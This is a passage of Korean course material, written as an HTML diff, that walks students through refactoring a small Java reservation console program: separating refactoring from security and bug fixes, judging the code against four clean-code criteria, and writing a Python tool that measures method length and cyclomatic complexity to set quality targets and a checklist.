+  <h5>절차 6 — 제출목록을 만든다</h5>
+
+  <p class="cmdline"><code>리팩토링\제출목록.md
+
+| 폴더 | 파일 | 만드는 실습 | 상태 |
+|------|------|-------------|------|
+| 분석 | 깨끗한코드기준.md | 4 | |
+| 분석 | 품질목표.md | 5 | |
+| 분석 | 체크리스트.md | 5 | |
+| 분석 | 절차.md | 5 | |
+| 분석 | 표준위반.md | 6 | |
+| 분석 | 보안약점.md | 8 | |
+| 분석 | 회귀시험결과.md | 14 | |
+| 분석 | 체크리스트결과.md | 15 | |
+| 분석 | 다음차례.md | 15 | |
+| 도구 | 복잡도.py | 5 | |
+| 도구 | 표준검사.py | 6 | |
+| 도구 | 죽은코드.py | 7 | |
+| 도구 | 보안약점.py | 8 | |
+| 도구 | 회귀테스트.py | 14 | |
+| step1a | src | 9 | |
+| step1b | src | 10 | |
+| step1 | src | 11 | |
+| step2 | src | 12 · 13 | |</code></p>
+
+  <p>열여덟 줄입니다. 실습이 끝날 때마다 상태 칸을 채우십시오.</p>
+
+  <h5>절차 7 — 파이썬과 자바를 확인한다</h5>
+
+  <p class="cmdline"><code>&gt; python --version
+Python 3.12.10
+&gt; javac -version
+javac 21.0.2</code></p>
+
+  <div class="note">판이 조금 달라도 상관없습니다.
+    분석 도구는 <code>re</code> 와 <code>pathlib</code> 만 쓰고,
+    자바 쪽도 특별한 문법 없이 클래스와 메서드만 씁니다.
+    다만 자바 판이 8 이하면 <code>-Dstdout.encoding</code> 이 안 먹으므로 한글이 깨질 수 있습니다.
+  </div>
+
+  <h5>안 될 때 볼 곳</h5>
+
+  <table class="wide">
+    <tr><th style="width:330px">이런 일이 생기면</th><th>볼 곳</th></tr>
+    <tr><td><code>git</code> 이 없다</td>
+        <td>없어도 진행됩니다. 폴더를 복사해 두는 것으로 대신하십시오</td></tr>
+    <tr><td><code>git init</code> 에서 이름을 묻는다</td>
+        <td><code>git config user.name</code> 과 <code>user.email</code> 을 정하십시오</td></tr>
+    <tr><td>되돌리기가 안 된다</td>
+        <td>커밋을 먼저 해야 <code>checkout</code> 이 돌아갈 자리를 압니다</td></tr>
+    <tr><td>폴더가 다섯 개나 필요한가</td>
+        <td>필요합니다. 실습 14 에서 넷을 서로 견줍니다</td></tr>
+  </table>
+
+  <p><b>제출물</b> — 폴더를 만든 화면, <code>before\classes</code> 확인,
+     <code>git log</code> 첫 커밋, 되돌리기 연습 화면(오류와 복구),
+     <code>제출목록.md</code>(열여덟 줄), 판 확인 화면</p>
+
+  <p><b>스스로 확인</b> —
+     ① 폴더 여덟 개를 만들었습니까
+     ② 고치기 전 판을 컴파일해 두었습니까
+     ③ 첫 커밋을 남겼습니까
+     ④ 망가뜨렸다가 되돌려 보았습니까</p>
+</div>
+      </div>
+</div>
+
+<h3 class="lv">레벨 2 · 기준 수립 <span>능력단위요소 ① · 무엇을 어디까지 고칠지 정합니다</span></h3>
+
+<div class="step" id="st3">
+      <h3><i>3</i>리팩토링과 그 시점</h3>
+      <aside class="side">
+        <p class="pt">기능은 그대로, 안만 고칩니다.</p>
+        <b class="sh">근거</b>
+        <p class="v">학습모듈 1-1</p>
+        <b class="sh">용어</b>
+        <p class="v">리팩토링 · 기능 보존</p>
+      </aside>
+      <div class="bd">
+
+<h4>무엇이 리팩토링인가</h4>
+
+<table class="wide">
+  <tr><th style="width:150px">하는 일</th><th style="width:150px">겉으로 달라지나</th><th>무엇이라 부르나</th></tr>
+  <tr><td>메서드를 나눈다</td><td>안 달라짐</td><td>리팩토링</td></tr>
+  <tr><td>변수 이름을 바꾼다</td><td>안 달라짐</td><td>리팩토링</td></tr>
+  <tr><td>안 쓰는 메서드를 지운다</td><td>안 달라짐</td><td>리팩토링</td></tr>
+  <tr><td>검사를 하나 더 넣는다</td><td>달라짐</td><td>기능 추가</td></tr>
+  <tr><td>버그를 고친다</td><td>달라짐</td><td>결함 조치</td></tr>
+  <tr><td>SQL 삽입을 막는다</td><td>달라짐</td><td>보안 조치</td></tr>
+</table>
+
+<p>아래 셋은 리팩토링이 아닙니다.
+   이 교안에서도 실습 12 와 13 은 보안 조치로 다루고 커밋을 따로 끊습니다.
+   같은 커밋에 섞이면 시험 결과가 달라졌을 때 어느 쪽 탓인지 가릴 수 없습니다.</p>
+
+<h4>언제 하는가</h4>
+
+<p class="cmdline"><code>기능을 더하기 전     넣을 자리를 먼저 만들어 둡니다
+버그를 고칠 때       같은 자리에서 자꾸 나면 구조가 문제입니다
+코드 리뷰 뒤        지적받은 자리를 모아서 고칩니다
+틈틈이             따로 시간을 내면 계속 미뤄집니다</code></p>
+
+<p>마지막 줄이 실무에서 가장 어렵습니다.
+   일정표에 「리팩토링 3일」이라고 적어 두면 그 사흘은 제일 먼저 잘립니다.
+   기능을 하나 만들 때 그 언저리를 조금씩 고치는 편이 오래갑니다.</p>
+
+<h4>언제 하면 안 되는가</h4>
+
+<p class="cmdline"><code>시험이 없을 때        고쳤는지 망가뜨렸는지 알 수 없습니다
+납기 직전           되돌릴 시간이 없습니다
+남의 코드를 통째로     왜 그렇게 짰는지 모른 채 고치게 됩니다
+큰 덩어리를 한 번에    어디서 틀어졌는지 못 찾습니다</code></p>
+
+<div class="warn">첫 줄이 가장 중요합니다.
+  회귀 테스트 없이 하는 리팩토링은 눈을 감고 하는 수술과 같습니다.
+  이 교안에서 실습 14 가 뒤쪽에 있지만, 실제로는 실습 9 에 들어가기 전에
+  회귀 테스트를 먼저 만들어 두는 것이 순서입니다.
+  실습 2 에서 <code>before</code> 를 컴파일해 둔 것이 그 준비입니다.
+</div>
+
+<h4>작게 나눠서 합니다</h4>
+
+<p class="cmdline"><code>한 번에 하면
+  고침 → 시험 → 실패 → 어디서 틀어졌는지 모름
+
+나눠서 하면
+  고침 → 시험 → 통과 → 커밋
+  고침 → 시험 → 실패 → 방금 것만 되돌림</code></p>
+
+<p>되돌릴 수 있는 단위로 끊는 것이 요령입니다. 형상관리를 앞 교과에서 배운 것이 여기서 쓰입니다.</p>
+      <div class="lab">
+  <b class="t">실습 3</b>
+  <b>리팩토링인지 아닌지 가른다</b>
+
+  <p><b>목적</b> — 고칠 거리를 늘어놓고 하나씩 갈라 봅니다.
+     겉으로 드러나는 동작이 달라지는 것과 안 달라지는 것을 미리 나눠 두면
+     뒤에서 커밋을 어디서 끊어야 하는지가 저절로 정해집니다.</p>
+
+  <h5>절차 1 — 고칠 거리를 늘어놓는다</h5>
+
+  <p class="cmdline"><code>분석\고칠거리.md
+
+| 번호 | 무엇을 고치나 |
+|------|---------------|
+| 1 | process 를 여러 메서드로 나눈다 |
+| 2 | data 를 facilities 로 고친다 |
+| 3 | Format_Name 과 unused 를 지운다 |
+| 4 | 시설 자료를 다루는 일을 다른 클래스로 옮긴다 |
+| 5 | ok 깃발을 없앤다 |
+| 6 | SQL 을 바인딩 방식으로 바꾼다 |
+| 7 | 화면에 찍을 때 특수 글자를 바꾼다 |
+| 8 | 날짜의 일자까지 검사한다 |
+| 9 | 정원 계산이 늘 0 인 버그를 고친다 |</code></p>
+
+  <h5>절차 2 — 겉으로 달라지는지 갈라 본다</h5>
+
+  <p class="cmdline"><code>| 번호 | 출력이 달라지나 | 갈래 |
+|------|-----------------|------|
+| 1 | 아니오 | 리팩토링 |
+| 2 | 아니오 | 리팩토링 |
+| 3 | 아니오 | 리팩토링 |
+| 4 | 아니오 | 리팩토링 |
+| 5 | 아니오 | 리팩토링 |
+| 6 | 예 | 보안 조치 |
+| 7 | 예 | 보안 조치 |
+| 8 | 예 | 기능 추가 |
+| 9 | 예 | 결함 조치 |</code></p>
+
+  <p>다섯이 리팩토링이고 넷이 아닙니다.
+     이 교안에서는 1~7 만 하고 8과 9는 손대지 않습니다.</p>
+
+  <h5>절차 3 — 안 하는 둘을 확인해 본다</h5>
+
+  <p class="cmdline"><code>9번이 진짜 버그인지 봅니다
+
+  int used = 0;
+  for (int i = 0; i &lt; data.size(); i++) {
+      if (data.get(i).length &gt; 3 &amp;&amp; data.get(i)[3].equals(day)) {
+          used++;
+      }
+  }
+
+data 에 담긴 배열은 원소가 셋입니다 — {"F01", "체육관 A", "20"}
+length &gt; 3 이 참이 되는 일이 없으므로 used 는 늘 0 입니다
+정원 검사가 사실상 안 돌고 있습니다</code></p>
+
+  <div class="warn">리팩토링을 하다 보면 이런 것이 눈에 들어옵니다.
+    고치고 싶겠지만 지금은 참으십시오.
+    고치면 「정원을 넘었습니다」가 찍히기 시작해서 회귀 시험이 깨지고,
+    그러면 구조를 고치다 깨뜨린 것인지 버그를 고쳐서 달라진 것인지 가릴 수 없습니다.
+    <b>발견한 것은 적어 두고, 고치는 것은 다음 차례로 미룹니다.</b>
+  </div>
+
+  <h5>절차 4 — 미룬 것을 적어 둔다</h5>
+
+  <p class="cmdline"><code>분석\다음차례.md
+
+| 무엇 | 갈래 | 왜 지금 안 하나 |
+|------|------|-----------------|
+| 정원 검사가 안 도는 문제 | 결함 조치 | 출력이 달라져 회귀 시험과 섞임 |
+| 날짜 일자 검사 추가 | 기능 추가 | 이번 범위가 아님 |</code></p>
+
+  <p>적어 두는 것만으로도 절반은 한 것입니다. 잊어버리면 다음 사람이 같은 자리를 또 발견합니다.</p>
+
+  <h5>절차 5 — 언제 하면 안 되는지 우리 상황에 대 본다</h5>
+
+  <p class="cmdline"><code>| 하면 안 되는 때 | 우리는 | 판정 |
+|-----------------|--------|------|
+| 시험이 없을 때 | 실행 결과 15줄을 남겨 두었음 | 괜찮음 |
+| 납기 직전 | 수업 중이라 여유가 있음 | 괜찮음 |
+| 남의 코드를 통째로 | 100줄짜리 한 파일 | 괜찮음 |
+| 한 번에 큰 덩어리를 | 다섯 판으로 나눌 것임 | 괜찮음 |</code></p>
+
+  <h5>절차 6 — 끊을 자리를 미리 정한다</h5>
+
+  <p class="cmdline"><code>커밋 1  구조 개선    1 · 2 · 3 · 4 · 5    회귀 0개여야 함
+커밋 2  보안 조치    6 · 7               회귀 5개 예상
+
+두 커밋 사이에서 회귀 시험의 판정 기준이 달라집니다</code></p>
+
+  <p>여기서 정한 두 줄이 실습 11 과 13 에서 그대로 커밋 메시지가 됩니다.</p>
+
+  <h5>안 될 때 볼 곳</h5>
+
+  <table class="wide">
+    <tr><th style="width:330px">이런 일이 생기면</th><th>볼 곳</th></tr>
+    <tr><td>9번이 버그인지 모르겠다</td>
+        <td>배열 길이를 직접 찍어 보십시오</td></tr>
+    <tr><td>보안 조치도 리팩토링 아닌가</td>
+        <td>출력이 달라지는지만 보십시오. 달라지면 아닙니다</td></tr>
+    <tr><td>이름 바꾸기가 리팩토링인가</td>
+        <td>안에서만 쓰는 이름이면 그렇습니다</td></tr>
+    <tr><td>공개된 메서드 이름을 바꾸면</td>
+        <td>부르는 쪽이 깨지므로 갈래가 달라집니다</td></tr>
+  </table>
+
+  <p><b>제출물</b> — <code>고칠거리.md</code>(아홉 줄),
+     갈래를 가른 표, 9번을 확인한 근거,
+     <code>다음차례.md</code>, 커밋을 끊을 자리</p>
+
+  <p><b>스스로 확인</b> —
+     ① 고칠 거리를 아홉 개 이상 늘어놓았습니까
+     ② 출력이 달라지는지로 갈랐습니까
+     ③ 지금 안 할 것을 적어 두었습니까
+     ④ 커밋을 어디서 끊을지 정했습니까</p>
+</div>
+      </div>
+</div>
+
+<div class="step" id="st4">
+      <h3><i>4</i>깨끗한 코드의 기준</h3>
+      <aside class="side">
+        <p class="pt">넷으로 나눠 봅니다.</p>
+        <b class="sh">근거</b>
+        <p class="v">학습모듈 1-1</p>
+        <b class="sh">용어</b>
+        <p class="v">가독성 · 변경 용이성 · 중복 · 주의 깊음</p>
+      </aside>
+      <div class="bd">
+
+<h4>네 가지 기준</h4>
+
+<table class="wide">
+  <tr><th style="width:150px">기준</th><th>무엇을 뜻하나</th></tr>
+  <tr><td>가독성이 좋다</td><td>잘 쓴 문장처럼 읽히고 설계자의 뜻이 보입니다</td></tr>
+  <tr><td>고치기 쉽다</td><td>남이 읽어도 어디를 고칠지 바로 압니다</td></tr>
+  <tr><td>중복이 없다</td><td>같은 일을 여러 군데서 되풀이하지 않습니다</td></tr>
+  <tr><td>주의 깊다</td><td>고치려고 봐도 손댈 곳이 마땅치 않습니다</td></tr>
+</table>
+
+<h4>우리 코드를 넷에 대 봅니다</h4>
+
+<p class="cmdline"><code>가독성     ✗  process() 를 끝까지 읽어야 무엇을 하는지 압니다
+고치기     ✗  검사를 하나 더 넣으려면 if (ok) 를 또 씁니다
+중복       ✗  data 를 훑는 for 문이 두 번 나옵니다
+주의       ✗  안 쓰는 메서드가 둘, 안 쓰는 필드가 하나 있습니다</code></p>
+
+<h4>가독성은 이름에서 갈립니다</h4>
+
+<p class="cmdline"><code>data               →  facilities      무엇이 담겼는지
+count              →  acceptedCount   무엇을 센 것인지
+p                  →  parts           쪼갠 조각
+ok                 →  (없앰)          깃발 대신 이른 반환
+LASTERROR          →  (없앰)          돌려주는 값으로 바꿈</code></p>
+
+<p>아래 두 줄은 이름을 고치는 쪽이 아니라 아예 없애는 쪽입니다.
+   좋은 이름을 못 찾겠으면 그 변수가 필요 없는 경우가 많습니다.</p>
+
+<h4>중복을 찾습니다</h4>
+
+<p class="cmdline"><code>for (int i = 0; i &lt; data.size(); i++) {
+    if (data.get(i)[0].equals(facility)) { ... }
+}
+
+for (int i = 0; i &lt; data.size(); i++) {
+    if (data.get(i).length &gt; 3 &amp;&amp; data.get(i)[3].equals(day)) { ... }
+}
+
+시설 자료를 훑는 일이 두 번 나옵니다</code></p>
+
+<p>둘 다 시설 자료를 훑습니다. 시설 자료를 다루는 일은 시설 자료를 가진 쪽으로 옮기는 편이 낫습니다.</p>
+
+<div class="note">이것이 실습 10 에서 다루는 메서드 이동입니다.
+  자료가 있는 곳에 그 자료를 다루는 메서드를 두면 훑는 코드가 한 곳에 모입니다.
+  정적모델 설계 교과에서 자료와 그에 딸린 동작을 함께 묶는다고 한 말이
+  실제로 무엇을 뜻하는지 이 자리에서 드러납니다.
+</div>
+
+<h4>기준을 문서로 적습니다</h4>
+
+<p class="cmdline"><code>분석\깨끗한코드기준.md
+
+| 기준 | 우리 판정 | 근거 | 고칠 실습 |
+|------|-----------|------|-----------|
+| 가독성 | 미달 | process 64줄 · 복잡도 19 | 9 · 11 |
+| 고치기 쉬움 | 미달 | 검사 추가 시 if (ok) 반복 | 9 |
+| 중복 없음 | 미달 | 시설 자료 순회 2회 | 10 |
+| 주의 깊음 | 미달 | 죽은 코드 3건 | 7 |</code></p>
+      <div class="lab">
+  <b class="t">실습 4</b>
+  <b>네 기준으로 판정하고 근거를 적는다</b>
+
+  <p><b>목적</b> — 「코드가 지저분하다」는 말은 근거가 되지 않습니다.
+     네 기준으로 나눠서 어느 기준에 왜 미달인지를 한 줄씩 적으면
+     고칠 자리와 고칠 순서가 같이 정해집니다.</p>
+
+  <h5>절차 1 — 가독성을 판정한다</h5>
+
+  <p class="cmdline"><code>물음  이 메서드가 무엇을 하는지 열 줄만 읽고 말할 수 있는가
+
+  process 의 첫 열 줄
+    String sql = "";
+    String msg = "";
+    boolean ok = true;
+    int cap = 0;
+    String name = null;
+    if (member == null || member.length() == 0) { ... }
+
+  선언 다섯 줄과 검사 하나. 무엇을 하는 메서드인지 아직 모릅니다</code></p>
+
+  <p>끝까지 읽어야 알 수 있으면 가독성이 미달입니다.</p>
+
+  <h5>절차 2 — 고치기 쉬운지 판정한다</h5>
+
+  <p class="cmdline"><code>물음  검사를 하나 더 넣으려면 몇 줄을 건드리나
+
+  지금 방식
+    if (ok) {
+        if (새 조건) {
+            LASTERROR = "...";
+            ok = false;
+        }
+    }
+  여섯 줄이 붙고 들여쓰기가 한 단 깊어집니다
+
+  검사가 열 개가 되면 if (ok) 도 열 개가 됩니다</code></p>
+
+  <h5>절차 3 — 중복을 센다</h5>
+
+  <p class="cmdline"><code>&gt; powershell -c "(Select-String before\src\ReservationConsole.java -Pattern 'for (int i = 0' -SimpleMatch).Count"
+2</code></p>
+
+  <p>같은 꼴의 반복문이 둘입니다.
+     하나는 시설을 찾고 하나는 그날 잡힌 건수를 세는데, 둘 다 같은 목록을 처음부터 끝까지 훑습니다.
+     목록의 구조를 바꾸면 두 군데를 다 고쳐야 합니다.</p>
+
+  <h5>절차 4 — 주의 깊은지 판정한다</h5>
+
+  <p class="cmdline"><code>물음  손댈 곳이 없는가
+
+  Format_Name   아무도 안 부름
+  unused        아무도 안 부름
+  max           선언만 되어 있음
+  sql, msg      선언해 놓고 한참 뒤에야 값이 들어감
+  p, mm         이름만으로는 무엇인지 모름</code></p>
+
+  <p>다섯 줄이 나왔습니다. 마지막 두 줄은 도구가 못 찾는 갈래입니다.</p>
+
+  <h5>절차 5 — 판정표를 채운다</h5>
+
+  <p class="cmdline"><code>분석\깨끗한코드기준.md
+
+| 기준 | 판정 | 근거 | 고칠 실습 |
+|------|------|------|-----------|
+| 가독성이 좋다 | 미달 | 열 줄을 읽어도 무엇을 하는지 모름 | 9 · 11 |
+| 고치기 쉽다 | 미달 | 검사 하나에 여섯 줄과 들여쓰기 한 단 | 11 |
+| 중복이 없다 | 미달 | 같은 목록을 훑는 반복문 2개 | 10 |
+| 주의 깊다 | 미달 | 안 쓰는 것 3개 · 뜻 모를 이름 2개 | 9 |</code></p>
+
+  <h5>절차 6 — 이름을 어떻게 바꿀지 정한다</h5>
+
+  <p class="cmdline"><code>분석\이름표.md
+
+| 지금 | 바꿀 이름 | 왜 |
+|------|-----------|-----|
+| data | facilities | 무엇이 담겼는지 |
+| count | acceptedCount | 무엇을 센 것인지 |
+| LASTERROR | lastError | 필드는 낙타 표기 |
+| p | parts | 쪼갠 조각 |
+| mm | month | 달 |
+| ok | (없앰) | 이른 반환으로 갈음 |
+| sql | (없앰) | 만들자마자 넘김 |
+| msg | (없앰) | 찍는 쪽에서 만듦 |</code></p>
+
+  <div class="note">「없앰」이 셋입니다.
+    좋은 이름이 잘 안 떠오르는 변수는 대개 없어도 되는 변수입니다.
+    <code>ok</code> 를 무엇이라 부를지 한참 고민하다가 없애는 쪽이 낫다는 것을 알게 되는 식입니다.
+    이름 짓기가 어렵다고 느껴지면 구조를 의심해 보십시오.
+  </div>
+
+  <h5>절차 7 — 실습 1 의 손으로 찾은 것과 견준다</h5>
+
+  <p class="cmdline"><code>| 내가 손으로 찾은 것 | 네 기준의 어디에 | 도구가 찾을까 |
+|---------------------|------------------|---------------|
+| | | |</code></p>
+
+  <p>세 번째 칸은 지금은 짐작으로 적고, 실습 6 부터 답을 맞춰 보십시오.
+     짐작이 틀리는 자리가 도구의 한계입니다.</p>
+
+  <h5>안 될 때 볼 곳</h5>
+
+  <table class="wide">
+    <tr><th style="width:330px">이런 일이 생기면</th><th>볼 곳</th></tr>
+    <tr><td>네 기준이 겹쳐 보인다</td>
+        <td>겹칩니다. 어느 칸에 넣든 근거만 적으면 됩니다</td></tr>
+    <tr><td>전부 미달로 나온다</td>
+        <td>일부러 그렇게 만든 코드입니다</td></tr>
+    <tr><td>이름을 무엇으로 바꿀지 모르겠다</td>
+        <td>무엇이 담기는지 한 문장으로 말해 보고 줄이십시오</td></tr>
+    <tr><td>내 코드로 해도 되나</td>
+        <td>됩니다. 판정표와 이름표를 같은 꼴로 만드십시오</td></tr>
+  </table>
+
+  <p><b>제출물</b> — 네 기준 판정 근거, 중복을 센 화면,
+     <code>깨끗한코드기준.md</code>, <code>이름표.md</code>(여덟 줄),
+     실습 1 과 견준 표</p>
+
+  <p><b>스스로 확인</b> —
+     ① 기준마다 근거를 한 줄씩 적었습니까
+     ② 중복된 반복문을 세어 봤습니까
+     ③ 바꿀 이름을 미리 정했습니까
+     ④ 없앨 변수를 골랐습니까</p>
+</div>
+      </div>
+</div>
+
+<div class="step" id="st5">
+      <h3><i>5</i>품질 목표와 체크리스트</h3>
+      <aside class="side">
+        <p class="pt">숫자로 재는 목표를 세웁니다.</p>
+        <b class="sh">근거</b>
+        <p class="v">학습모듈 1-1</p>
+        <b class="sh">용어</b>
+        <p class="v">품질 목표 · 체크리스트</p>
+      </aside>
+      <div class="bd">
+
+<h4>지금 값부터 잽니다</h4>
+
+<p class="cmdline"><code>&gt; python 복잡도.py before\src
+파일                        메서드                 줄     복잡도
+----------------------------------------------------------
+ReservationConsole.java   main                9       1
+ReservationConsole.java   seed                4       1
+ReservationConsole.java   process            64      19
+ReservationConsole.java   report              3       1
+ReservationConsole.java   Format_Name         3       1
+ReservationConsole.java   unused              4       1
+----------------------------------------------------------
+메서드 6개 · 가장 긴 것 64줄 · 최대 복잡도 19</code></p>
+
+<h4>목표를 정합니다</h4>
+
+<p class="cmdline"><code>분석\품질목표.md
+
+| 지표 | 지금 | 목표 | 어떻게 정했나 |
+|------|------|------|---------------|
+| 최대 순환 복잡도 | 19 | 10 이하 | 소프트웨어공학 활용에서 쓴 선 |
+| 가장 긴 메서드 | 64줄 | 30줄 이하 | 한 화면에 들어오는 길이 |
+| 표준 검사 지적 | 5건 | 0건 | 도구가 판정하므로 0 이 가능 |
+| 죽은 코드 | 3건 | 0건 | 지우면 되는 것들 |
+| 보안 약점 | 5건 | 0건 | 실습 12 · 13 에서 |
+| 회귀 시험 다른 줄 | - | 0개 | 구조 개선 구간에 한해서 |</code></p>
+
+<p>맨 아래 줄에 조건이 붙은 것을 보십시오.
+   보안 조치 구간에서는 이 목표가 0 일 수 없어서 따로 적어야 합니다.</p>
+
+<h4>체크리스트를 만듭니다</h4>
+
+<p class="cmdline"><code>분석\체크리스트.md
+
+| 번호 | 확인할 것 | 어떻게 | 통과 조건 |
+|------|-----------|--------|-----------|
+| 1 | 기능이 그대로인가 | 회귀테스트.py | 다른 줄 0개 |
+| 2 | 컴파일되는가 | javac | 오류 0 |
+| 3 | 개발 표준을 지키는가 | 표준검사.py | 지적 0건 |
+| 4 | 죽은 코드가 없는가 | 죽은코드.py | 진짜 지적 0건 |
+| 5 | 보안 약점이 없는가 | 보안약점.py | 진짜 지적 0건 |
+| 6 | 복잡도가 목표 안인가 | 복잡도.py | 10 이하 |
+| 7 | 메서드가 짧은가 | 복잡도.py | 30줄 이하 |
+| 8 | 커밋이 나뉘어 있는가 | git log | 구조와 보안이 따로 |</code></p>
+
+<div class="warn">4번과 5번에 「진짜」라는 말이 붙어 있습니다.
+  우리 도구는 정규식으로 줄을 훑는 방식이라 오탐이 섞입니다.
+  실습 7 에서 세 건, 실습 8 에서 두 건이 오탐으로 나오는데,
+  그런 줄까지 0으로 만들려고 코드를 이상하게 고치면 본말이 뒤집힙니다.
+  <b>지적을 하나씩 열어 보고 진짜인지 가리는 것까지가 분석</b>입니다.
+</div>
+
+<h4>쓸 도구와 절차를 적습니다</h4>
+
+<p class="cmdline"><code>분석\절차.md
+
+① 회귀 테스트를 먼저 준비한다        before 를 컴파일해 둔다
+② 분석 도구를 돌려 목록을 만든다      표준 · 죽은코드 · 보안 · 복잡도
+③ 구조만 고친다                    step1
+④ 회귀 테스트 — 다른 줄 0개 확인     통과해야 다음으로
+⑤ 커밋한다                        구조 개선으로
+⑥ 보안을 고친다                    step2
+⑦ 회귀 테스트 — 바뀐 줄을 설명한다    다섯 줄과 까닭
+⑧ 커밋한다                        보안 조치로
+⑨ 체크리스트 여덟 줄을 대조한다</code></p>
+
+<p>④와 ⑦이 다른 판정을 받는다는 것이 이 절차의 요점입니다.</p>
+      <div class="lab">
+  <b class="t">실습 5</b>
+  <b>복잡도.py 를 만들고 기준서를 쓴다</b>
+
+  <p><b>목적</b> — 판정할 숫자가 없으면 다 고친 뒤에도 나아졌는지 말할 수 없습니다.
+     메서드마다 줄 수와 분기 수를 세는 도구를 만들고, 그 숫자로 목표를 잡습니다.</p>
+
+  <h5>절차 1 — 메서드 머리를 찾는 부분을 쓴다</h5>
+
+  <p class="cmdline"><code>도구\복잡도.py
+
+# -*- coding: utf-8 -*-
+"""메서드마다 줄 수와 순환 복잡도를 센다."""
+import re, sys
+from pathlib import Path
+
+시작 = re.compile(r"^\s*(?:public|private|protected|static|final|\s)+[\w&lt;&gt;\[\]]+\s+(\w+)\s*\(")
+분기 = re.compile(r"\b(?:if|for|while|case|catch)\b|&amp;&amp;|\|\|")
+예약 = {"if", "for", "while", "switch", "catch", "return", "new"}
+
+
+def 머리(줄, i):
+    """i 번째 줄이 메서드 머리면 (이름, 머리가 끝나는 줄) 을 돌려준다."""
+    m = 시작.match(줄[i])
+    if not m or m.group(1) in 예약:
+        return None
+    for j in range(i, min(i + 4, len(줄))):
+        t = 줄[j].rstrip()
+        if t.endswith("{"):
+            return m.group(1), j
+        if t.endswith(";"):
+            return None
+    return None</code></p>
+
+  <p>머리가 여러 줄에 걸쳐 있을 수 있어서 네 줄까지 앞을 내다봅니다.
+     <code>;</code> 로 끝나면 선언만 있는 것이라 메서드가 아닙니다.</p>
+
+  <h5>절차 2 — 몸통을 세는 부분을 쓴다</h5>
+
+  <p class="cmdline"><code>경로 = sys.argv[1] if len(sys.argv) &gt; 1 else "before/src"
+행 = []
+for f in sorted(Path(경로).rglob("*.java")):
+    줄 = f.read_text(encoding="utf-8").splitlines()
+    i = 0
+    while i &lt; len(줄):
+        it = 머리(줄, i)
+        if not it:
+            i += 1
+            continue
+        이름, 끝 = it
+        깊이 = sum(줄[k].count("{") - 줄[k].count("}") for k in range(i, 끝 + 1))
+        j, 본문 = 끝 + 1, 줄[i:끝 + 1]
+        while j &lt; len(줄) and 깊이 &gt; 0:
+            깊이 += 줄[j].count("{") - 줄[j].count("}")
+            본문.append(줄[j])
+            j += 1
+        행.append((f.name, 이름, len(본문),
+                   1 + sum(len(분기.findall(l)) for l in 본문)))
+        i = j</code></p>
+
+  <p>중괄호를 세면서 짝이 맞을 때까지 내려갑니다.
+     순환 복잡도는 분기 개수에 1을 더한 값으로 잡습니다.</p>
+
+  <h5>절차 3 — 찍는 부분을 쓴다</h5>
+
+  <p class="cmdline"><code>print(f"{'파일':&lt;26}{'메서드':&lt;16}{'줄':&gt;5}{'복잡도':&gt;8}")
+print("-" * 58)
+for f, n, c, x in 행:
+    print(f"{f:&lt;26}{n:&lt;16}{c:&gt;5}{x:&gt;8}")
+print("-" * 58)
+print(f"메서드 {len(행)}개 · 가장 긴 것 {max(c for _,_,c,_ in 행)}줄 · "
+      f"최대 복잡도 {max(x for _,_,_,x in 행)}")</code></p>
+
+  <h5>절차 4 — 돌린다</h5>
+
+  <p class="cmdline"><code>&gt; python 복잡도.py before\src
+파일                        메서드                 줄     복잡도
+----------------------------------------------------------
+ReservationConsole.java   main                9       1
+ReservationConsole.java   seed                4       1
+ReservationConsole.java   process            64      19
+ReservationConsole.java   report              3       1
+ReservationConsole.java   Format_Name         3       1
+ReservationConsole.java   unused              4       1
+----------------------------------------------------------
+메서드 6개 · 가장 긴 것 64줄 · 최대 복잡도 19</code></p>
+
+  <p>process 하나가 64줄에 분기 열여덟입니다. 나머지 다섯을 합쳐도 스물세 줄입니다.</p>
+
+  <h5>절차 5 — 목표를 정한다</h5>
+
+  <p class="cmdline"><code>분석\품질목표.md
+
+| 지표 | 지금 | 목표 | 어떻게 정했나 |
+|------|------|------|---------------|
+| 최대 순환 복잡도 | 19 | 10 이하 | 소프트웨어공학 활용에서 쓰던 선 |
+| 가장 긴 메서드 | 64줄 | 30줄 이하 | 화면 하나에 들어오는 길이 |
+| 표준 검사 지적 | ? | 0건 | 도구가 판정하므로 0 이 가능 |
+| 죽은 코드 | ? | 0건 | 지우면 되는 것들 |
+| 보안 약점 | ? | 0건 | 실습 12 · 13 에서 |
+| 회귀 시험 다른 줄 | - | 0개 (구조 개선 구간) | 기능 보존의 원칙 |</code></p>
+
+  <p>물음표 셋은 실습 6 부터 채웁니다. 도구를 안 만들었으니 아직 값이 없습니다.</p>
+
+  <div class="warn">맨 아래 줄에 괄호가 붙은 것을 눈여겨보십시오.
+    보안 조치 구간에서는 이 목표가 0 일 수 없습니다.
+    조건 없이 「회귀 시험 0개」라고만 적어 두면 실습 13 을 마치고 나서 목표 미달이 됩니다.
+    <b>목표에 구간을 붙여 두지 않으면 지킬 수 없는 목표가 됩니다.</b>
+  </div>
+
+  <h5>절차 6 — 체크리스트를 만든다</h5>
+
+  <p class="cmdline"><code>분석\체크리스트.md
+
+| 번호 | 확인할 것 | 어떻게 | 통과 조건 |
+|------|-----------|--------|-----------|
+| 1 | 기능이 그대로인가 | 회귀테스트.py | 다른 줄 0개 |
+| 2 | 컴파일되는가 | javac | 오류 0 |
+| 3 | 개발 표준을 지키는가 | 표준검사.py | 지적 0건 |
+| 4 | 죽은 코드가 없는가 | 죽은코드.py | 진짜 지적 0건 |
+| 5 | 보안 약점이 없는가 | 보안약점.py | 진짜 지적 0건 |
+| 6 | 복잡도가 목표 안인가 | 복잡도.py | 10 이하 |
+| 7 | 메서드가 짧은가 | 복잡도.py | 30줄 이하 |
+| 8 | 커밋이 나뉘어 있는가 | git log | 구조와 보안이 따로 |</code></p>
+
+  <h5>절차 7 — 절차를 적는다</h5>
+
+  <p class="cmdline"><code>분석\절차.md
+
+① 회귀 테스트를 준비한다        before 를 컴파일해 둔다      실습 2
+② 분석 도구 넷을 만든다         복잡도 · 표준 · 죽은코드 · 보안  실습 5 ~ 8
+③ 구조만 고친다                step1a → step1b → step1     실습 9 ~ 11
+④ 회귀 시험 — 다른 줄 0개       통과해야 다음으로            실습 14
+⑤ 커밋한다                    구조 개선                   실습 11
+⑥ 보안을 고친다                step2                      실습 12 · 13
+⑦ 회귀 시험 — 바뀐 줄을 설명한다  다섯 줄과 까닭              실습 14
+⑧ 커밋한다                    보안 조치                   실습 13
+⑨ 체크리스트 여덟 줄을 대조한다                            실습 15</code></p>
+
+  <p>④와 ⑦이 같은 도구로 다른 판정을 받습니다. 이 한 가지만 기억하면 나머지는 따라옵니다.</p>
+
